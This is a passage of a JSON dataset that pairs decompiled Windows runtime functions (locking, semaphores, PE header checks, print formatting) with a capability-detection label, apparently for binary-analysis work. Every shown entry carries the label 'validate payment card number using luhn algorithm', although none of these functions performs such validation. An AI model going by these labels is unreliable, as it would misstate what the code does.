0);\n    goto code_r0x00014001250b;\n}\n",
        "token_count": 1393
    },
    "1400135c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.1400135c0(int64_t arg1, int64_t arg2, uint64_t *arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iStack72;\n    uchar auStack64 [16];\n    int32_t iStack48;\n    \n    if ((arg1 == 0) || ((arg2 != 0 && (arg3 == NULL)))) {\n        if (arg4 == NULL) {\n            return 0;\n        }\n        *arg4 = 0xfffffffd;\n        return 0;\n    }\n    iStack72 = 0;\n    iStack48 = 0;\n    auStack64 = 0x0;\n    iVar1 = fcn.1400127b0(arg1, 0x14000aaf0, &iStack72);\n    iVar3 = iStack72;\n    if (iVar1 == 0) {\n        fcn.14001e510(iStack72);\n        if (arg4 == NULL) {\n            return 0;\n        }\ncode_r0x0001400136ff:\n        *arg4 = 0xfffffffe;\n        return 0;\n    }\n    if (iStack48 == 0) {\n        if (iStack72 == 0) {\n            if (arg4 == NULL) {\n                return 0;\n            }\n            if (auStack64._8_8_ != 1) goto code_r0x0001400136ff;\n            goto code_r0x0001400136a5;\n        }\n    }\n    else {\n        auStack64._8_8_ = 1;\n        if (iStack72 == 0) {\n            if (arg4 == NULL) {\n                return 0;\n            }\ncode_r0x0001400136a5:\n            *arg4 = 0xffffffff;\n            return 0;\n        }\n    }\n    if (arg2 == 0) {\n        if (arg3 == NULL) goto code_r0x00014001366e;\n    }\n    else {\n        uVar2 = sub.msvcrt.dll_strlen(iStack72);\n        if (uVar2 < *arg3) {\n            sub.msvcrt.dll_memcpy(arg2, iVar3, uVar2 + 1);\n            fcn.14001e510(iVar3);\n            iVar3 = arg2;\n            goto code_r0x00014001366e;\n        }\n        fcn.14001e510(arg2);\n    }\n    *arg3 = auStack64._8_8_;\ncode_r0x00014001366e:\n    if (arg4 != NULL) {\n        *arg4 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 607
    },
    "14001414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014140(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x1401361c0);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x1401361a0; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x0001400141a9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1401361c0);\n    return;\n}\n",
        "token_count": 249
    },
    "14001e7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001e7d0(ulong arg1, int64_t arg2)\n\n{\n    uint *puVar1;\n    \n    if (arg2 == 0) {\n        return 0;\n    }\n    if (*0x1401361a8 != 0) {\n        puVar1 = sub.msvcrt.dll_calloc(1, 0x18);\n        if (puVar1 == NULL) {\n            return 0xffffffff;\n        }\n        *(puVar1 + 2) = arg2;\n        *puVar1 = arg1;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x1401361c0);\n        *(puVar1 + 4) = *0x1401361a0;\n        *0x1401361a0 = puVar1;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1401361c0);\n    }\n    return 0;\n}\n",
        "token_count": 205
    },
    "1400144d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400144d0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    \n    if (((**0x140110860 == 0x5a4d) && (piVar3 = *(*0x140110860 + 0x1e) + *0x140110860,  *piVar3 == 0x4550)) &&\n       (*(piVar3 + 6) == 0x20b)) {\n        iVar2 = piVar3 + *(piVar3 + 5) + 0x18;\n        if (*(piVar3 + 6) != 0) {\n            iVar1 = iVar2 + 0x28;\n            do {\n                if ((*(iVar2 + 0xc) <= arg1 - *0x140110860) && (arg1 - *0x140110860 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                    return iVar2;\n                }\n                iVar2 = iVar2 + 0x28;\n            } while (iVar2 != iVar1 + (*(piVar3 + 6) - 1) * 0x28);\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 283
    },
    "14001455": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.140014550(void)\n\n{\n    int32_t *piVar1;\n    \n    if (((**0x140110860 == 0x5a4d) && (piVar1 = *0x140110860 + *(*0x140110860 + 0x1e),  *piVar1 == 0x4550)) &&\n       (*(piVar1 + 6) == 0x20b)) {\n        return *(piVar1 + 6);\n    }\n    return 0;\n}\n",
        "token_count": 113
    },
    "14001461": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.140014610(void)\n\n{\n    int16_t *piVar1;\n    \n    if ((**0x140110860 == 0x5a4d) && (*(*(*0x140110860 + 0x1e) + *0x140110860) == 0x4550)) {\n        piVar1 = NULL;\n        if (*(*(*0x140110860 + 0x1e) + *0x140110860 + 6) == 0x20b) {\n            piVar1 = *0x140110860;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 144
    },
    "1400147f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400147f0(int32_t *arg1, code *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    if ((arg1 != NULL) && (arg2 != NULL)) {\n        if (*arg1 == 0) {\n            LOCK();\n            piVar1 = arg1 + 1;\n            *piVar1 = *piVar1 + 1;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (*piVar1 == 0) {\n                (*arg2)();\n                *arg1 = 1;\n            }\n            else {\n                iVar2 = *arg1;\n                while (iVar2 == 0) {\n                    (*pcVar3)(0);\n                    iVar2 = *arg1;\n                }\n            }\n        }\n        return 0;\n    }\n    return 0x16;\n}\n",
        "token_count": 200
    },
    "14001493": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014930(uint *arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    *(arg1 + 2) = uVar1;\n    return;\n}\n",
        "token_count": 76
    },
    "14001497": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140014970(int32_t *hHandle)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    *hHandle = *hHandle + 1;\n    if (*hHandle != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(hHandle + 2), 0xffffffff);\n        if (iVar1 != 0) {\n            LOCK();\n            *hHandle = *hHandle + -1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "1400149e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1400149e0(int32_t *hSemaphore)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    LOCK();\n    *hSemaphore = *hSemaphore + -1;\n    bVar2 = false;\n    if (-1 < *hSemaphore) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(hSemaphore + 2), 1, 0);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 112
    },
    "140014a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014a10(ulong *arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = *0x14010f570;\n    *(arg1 + 1) = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "140014a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140014a50(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    LOCK();\n    *arg1 = *arg1 + 1;\n    if (*arg1 != 0) {\n        if (arg1[2] == iVar1) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            arg1[1] = arg1[1] + 1;\n            return 0;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(arg1 + 4), 0xffffffff);\n        if (iVar2 != 0) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            return 1;\n        }\n    }\n    arg1[1] = 1;\n    arg1[2] = iVar1;\n    return 0;\n}\n",
        "token_count": 213
    },
    "140014b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.140014b10(int32_t *hSemaphore)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = hSemaphore + 1;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        hSemaphore[2] = 0;\n        LOCK();\n        *hSemaphore = *hSemaphore + -1;\n        if (-1 < *hSemaphore) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(hSemaphore + 4), 1, 0);\n            return iVar2 == 0;\n        }\n    }\n    return false;\n}\n",
        "token_count": 150
    },
    "140014c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014c70(int64_t arg1)\n\n{\n    return **(*(arg1 + 0x20) + 0x10) + *(*(arg1 + 0x20) + 8);\n}\n",
        "token_count": 52
    },
    "140014ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140014ef0(int64_t arg1)\n\n{\n    int64_t aiStackX8 [4];\n    \n    *(arg1 + 0x10) = 0x0;\n    *(arg1 + 0x20) = 0x0;\n    *(arg1 + 0x30) = 0x0;\n    aiStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0, 0x20474343, 0, 1, aiStackX8);\n    return 5;\n}\n",
        "token_count": 127
    },
    "14001588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140015880(ushort param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cStack15;\n    ushort uStack14;\n    int32_t aiStack12 [3];\n    \n    aiStack12[0] = 0;\n    uStack14 = param_1;\n    uVar1 = sub.msvcrt.dll____lc_codepage_func();\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar1, 0, &uStack14, 1, &cStack15, 1, 0, aiStack12);\n    if ((iVar2 == 0) || (aiStack12[0] != 0)) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = cStack15;\n    }\n    return iVar2;\n}\n",
        "token_count": 188
    },
    "14002bd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.14002bd40(ulong param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    \n    if (param_2 < 0x41) {\n    // switch table (65 cases) at 0x14010ae30\n        switch(param_2) {\n        case 1:\n            pcVar2 = 0x14010adf8;\n            break;\n        case 2:\n            pcVar2 = 0x14010adfe;\n            break;\n        case 3:\n        case 5:\n        case 6:\n        case 7:\n        case 9:\n        case 10:\n        case 0xb:\n        case 0xd:\n        case 0xe:\n        case 0xf:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n        case 0x14:\n        case 0x15:\n        case 0x16:\n        case 0x17:\n        case 0x18:\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x21:\n        case 0x22:\n        case 0x23:\n        case 0x24:\n        case 0x25:\n        case 0x26:\n        case 0x27:\n        case 0x28:\n        case 0x29:\n        case 0x2a:\n        case 0x2b:\n        case 0x2c:\n        case 0x2d:\n        case 0x2e:\n        case 0x2f:\n        case 0x30:\n        case 0x31:\n        case 0x32:\n        case 0x33:\n        case 0x34:\n        case 0x35:\n        case 0x36:\n        case 0x37:\n        case 0x38:\n        case 0x39:\n        case 0x3a:\n        case 0x3b:\n        case 0x3c:\n        case 0x3d:\n        case 0x3e:\n        case 0x3f:\n            goto code_r0x00014002be43;\n        case 4:\n            pcVar2 = 0x14010ae04;\n            break;\n        case 8:\n            pcVar2 = 0x14010ae0a;\n            break;\n        case 0xc:\n            pcVar2 = 0x14010ae1d;\n            break;\n        case 0x10:\n            pcVar2 = 0x14010ae16;\n            break;\n        case 0x20:\n            pcVar2 = 0x14010ade6;\n            break;\n        case 0x40:\n            pcVar2 = 0x14010adec;\n            break;\n        default:\n            goto code_r0x00014002be40;\n        }\n    }\n    else {\n        if (param_2 == 0x200) {\n            pcVar2 = 0x14010ae10;\n            goto code_r0x000140015900;\n        }\n        if (param_2 == 0x20c) {\n            pcVar2 = 0x14010ae23;\n            goto code_r0x000140015900;\n        }\n        if (param_2 == 0x100) {\n            pcVar2 = 0x14010adf2;\n            goto code_r0x000140015900;\n        }\ncode_r0x00014002be43:\n        if (param_2 != 0x400) {\ncode_r0x00014002be40:\n            return 0;\n        }\n        pcVar2 = \"blank\";\n    }\ncode_r0x000140015900:\n    iVar3 = 0;\n    puVar4 = 0x14010f660;\n    do {\n        iVar1 = sub.msvcrt.dll_strcmp(pcVar2, *puVar4);\n        if (iVar1 == 0) {\n            return *(iVar3 * 0x10 + 0x14010f668);\n        }\n        iVar3 = iVar3 + 1;\n        puVar4 = puVar4 + 2;\n    } while (iVar3 != 0xb);\n    return 0;\n}\n",
        "token_count": 983
    },
    "140015a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140015a10(ulong stream)\n\n{\n    int32_t iVar1;\n    ulong auStack16 [2];\n    \n    iVar1 = sub.msvcrt.dll_fgetpos(stream, auStack16);\n    if (iVar1 != 0) {\n        auStack16[0] = 0xffffffffffffffff;\n    }\n    return auStack16[0];\n}\n",
        "token_count": 82
    },
    "140015aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015aa0(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (arg2 != 0) {\n        iVar2 = arg2 - 1U;\n        iVar1 = fcn.1400199a0(0, arg1, arg2 - 1U & 0xffffffff, arg3);\n        if (iVar1 <= iVar2) {\n            iVar2 = iVar1;\n        }\n        *(arg1 + iVar2) = 0;\n        return;\n    }\n    fcn.1400199a0(0, arg1, 0, arg3);\n    return;\n}\n",
        "token_count": 159
    },
    "140015fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015fc0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    iVar1 = *(arg1 + 0x14);\n    piVar3 = arg1 + 0x18;\n    do {\n        if (*piVar3 != 0) {\n            *piVar3 = *piVar3 + -1;\n            return;\n        }\n        piVar2 = piVar3 + 1;\n        *piVar3 = -1;\n        piVar3 = piVar2;\n    } while (piVar2 < arg1 + 0x18 + iVar1);\n    return;\n}\n",
        "token_count": 154
    },
    "140017ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140017ea0(ulong arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t arg2_00;\n    uint16_t uVar2;\n    uint32_t *in_stack_00000028;\n    uint auStack36 [3];\n    int64_t iStack24;\n    uint32_t uStack16;\n    \n    iStack24 = *arg2;\n    uStack16 = *(arg2 + 1);\n    uVar2 = uStack16 & 0x7fff;\n    uVar1 = iStack24 >> 0x20;\n    if ((uStack16 & 0x7fff) == 0) {\n        if ((iStack24 | uVar1) == 0) {\n            auStack36[0] = 0;\n            arg2_00 = 0;\n        }\n        else {\n            if (iStack24 < 0) goto code_r0x000140017edb;\n            auStack36[0] = 2;\n            arg2_00 = 0xffffbfc3;\n        }\n    }\n    else if (uVar2 == 0x7fff) {\n        if ((uVar1 & 0x7fffffff | iStack24) != 0) {\n            auStack36[0] = 4;\n            arg2_00 = 0;\n            uVar1 = 0;\n            goto code_r0x000140017ef4;\n        }\n        auStack36[0] = 3;\n        arg2_00 = 0;\n    }\n    else {\ncode_r0x000140017edb:\n        auStack36[0] = 1;\n        arg2_00 = uVar2 + 0xbfc2;\n    }\n    uVar1 = uStack16 & 0x8000;\ncode_r0x000140017ef4:\n    *in_stack_00000028 = uVar1;\n    fcn.14001a6e0(0x1401064f0, arg2_00, &iStack24, auStack36);\n    return;\n}\n",
        "token_count": 466
    },
    "140017f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140017f90(ulong c, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    \n    if (((*(arg2 + 1) & 0x4000) != 0) || (iVar1 = *(arg2 + 0x24),  *(arg2 + 5) != iVar1 && iVar1 <= *(arg2 + 5))) {\n        if ((*(arg2 + 1) & 0x2000) != 0) {\n            sub.msvcrt.dll_fputc(c, *arg2);\n            *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            return;\n        }\n        *(*arg2 + *(arg2 + 0x24)) = c;\n        iVar1 = *(arg2 + 0x24);\n    }\n    *(arg2 + 0x24) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 205
    },
    "1400182d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400182d0(uchar *arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    \n    if (arg1 == NULL) {\n        arg1 = 0x14010f8a0;\n    }\n    if (*(arg2 + 2) < 0) {\n        uVar3 = sub.msvcrt.dll_strlen();\n    }\n    else {\n        uVar3 = fcn.14001dcb0(arg1, *(arg2 + 2));\n    }\n    uVar1 = *(arg2 + 2);\n    uVar4 = uVar1;\n    if (uVar3 <= uVar1) {\n        uVar4 = uVar3;\n    }\n    if (-1 < uVar1) {\n        uVar3 = uVar4;\n    }\n    if (uVar3 < *(arg2 + 0xc)) {\n        iVar2 = *(arg2 + 0xc) - uVar3;\n        *(arg2 + 0xc) = iVar2;\n        uVar1 = *(arg2 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg2 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140017f90(0x20, arg2);\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (uVar3 == 0) goto code_r0x000140018221;\n            goto code_r0x0001400181be;\n        }\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = *(arg2 + 0xc) + -1;\n            goto code_r0x000140018231;\n        }\n    }\n    else {\n        *(arg2 + 0xc) = 0xffffffff;\n        if (uVar3 == 0) {\n            *(arg2 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x0001400181be:\n        uVar1 = *(arg2 + 1);\n    }\n    puVar5 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = *puVar5;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n        if (puVar5 + 1 == arg1 + uVar3) break;\n        uVar1 = *(arg2 + 1);\n        puVar5 = puVar5 + 1;\n    }\ncode_r0x000140018221:\n    while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg2 + 1);\ncode_r0x000140018231:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 954
    },
    "14001920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140019200(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    aStack56[0] = *noname_0;\n    if (*(arg2 + 0x10) < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 7;\n    }\n    else {\n        arg3 = *(arg2 + 0x10) + 1;\n    }\n    arg2_00 = fcn.140017ea0(2, aStack56, arg3, auStack28);\n    if (auStack28[0] != 0xffff8000) {\n        fcn.140019130(uStack32, arg2_00, auStack28[0], arg2);\n        fcn.14001a530(arg2_00);\n        return;\n    }\n    fcn.140018320(uStack32, arg2_00, arg2);\n    fcn.14001a530(arg2_00);\n    return;\n}\n",
        "token_count": 266
    },
    "1400192a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400192a0(unkbyte10 *noname_0, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    int32_t iVar2;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    arg3 = *(arg2 + 2);\n    aStack56[0] = *noname_0;\n    if (*(arg2 + 2) < 0) {\n        *(arg2 + 2) = 6;\n        arg3 = 6;\n    }\n    arg2_00 = fcn.140017ea0(3, aStack56, arg3, auStack28);\n    if (auStack28[0] == 0xffff8000) {\n        fcn.140018320(uStack32, arg2_00, arg2);\n    }\n    else {\n        fcn.140018d50(uStack32, arg2_00, auStack28[0], arg2);\n        iVar1 = *(arg2 + 0xc);\n        while( true ) {\n            *(arg2 + 0xc) = iVar1 + -1;\n            if (iVar1 < 1) break;\n            if (((*(arg2 + 1) & 0x4000) != 0) ||\n               (iVar2 = *(arg2 + 0x24),  iVar1 = iVar1 + -1,  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n                if ((*(arg2 + 1) & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n                else {\n                    sub.msvcrt.dll_fputc();\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n            }\n            *(arg2 + 0x24) = iVar2 + 1;\n        }\n    }\n    fcn.14001a530(arg2_00);\n    return;\n}\n",
        "token_count": 501
    },
    "14001938": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140019380(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uVar1 = *(arg2 + 0x10);\n    arg3 = uVar1;\n    aStack56[0] = *noname_0;\n    if (uVar1 < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 6;\n    }\n    else if (uVar1 == 0) {\n        *(arg2 + 0x10) = 1;\n        arg3 = 1;\n    }\n    arg2_00 = fcn.140017ea0(2, aStack56, arg3, &uStack28);\n    if (uStack28 != 0xffff8000) {\n        uVar1 = *(arg2 + 8) & 0x800;\n        if (-4 < uStack28) {\n            if (uStack28 <= *(arg2 + 0x10)) {\n                if (uVar1 == 0) {\n                    iVar2 = sub.msvcrt.dll_strlen();\n                    iVar2 = iVar2 - uStack28;\n                    *(arg2 + 0x10) = iVar2;\n                    if ((iVar2 < 0) && (0 < *(arg2 + 0xc))) {\n                        *(arg2 + 0xc) = iVar2 + *(arg2 + 0xc);\n                    }\n                }\n                else {\n                    *(arg2 + 0x10) = *(arg2 + 0x10) - uStack28;\n                }\n                fcn.140018d50(uStack32, arg2_00, uStack28, arg2);\n                while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n                    fcn.140017f90(0x20, arg2);\n                }\n                fcn.14001a530(arg2_00);\n                return;\n            }\n        }\n        if (uVar1 == 0) {\n            iVar2 = sub.msvcrt.dll_strlen();\n        }\n        else {\n            iVar2 = *(arg2 + 0x10);\n        }\n        *(arg2 + 0x10) = iVar2 + -1;\n        fcn.140019130(uStack32, arg2_00, uStack28, arg2);\n        fcn.14001a530(arg2_00);\n        return;\n    }\n    fcn.140018320(uStack32, arg2_00, arg2);\n    fcn.14001a530(arg2_00);\n    return;\n}\n",
        "token_count": 633
    },
    "14001c8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14001c8b0(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    puVar4 = arg1 + 0x18;\n    puVar1 = puVar4 + *(arg1 + 0x14);\n    iVar5 = 0;\n    while( true ) {\n        if (puVar1 <= puVar4) {\n            return iVar5;\n        }\n        if (*puVar4 != 0) break;\n        puVar4 = puVar4 + 1;\n        iVar5 = iVar5 + 0x20;\n    }\n    if (puVar1 <= puVar4) {\n        return iVar5;\n    }\n    iVar3 = 0;\n    for (uVar2 = *puVar4; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n        iVar3 = iVar3 + 1;\n    }\n    return iVar5 + iVar3;\n}\n",
        "token_count": 252
    },
    "14001c8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001c8f0(void)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    \n    pcVar3 = \"0123456789\";\n    uVar2 = 0x30;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x140136260) = cVar1 + 'P';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    pcVar3 = \"abcdef\";\n    uVar2 = 0x61;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x140136260) = cVar1 + 'O';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    pcVar3 = \"ABCDEF\";\n    uVar2 = 0x41;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x140136260) = cVar1 + 'H';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    return;\n}\n",
        "token_count": 296
    },
    "14001d01": {
        "rules": [
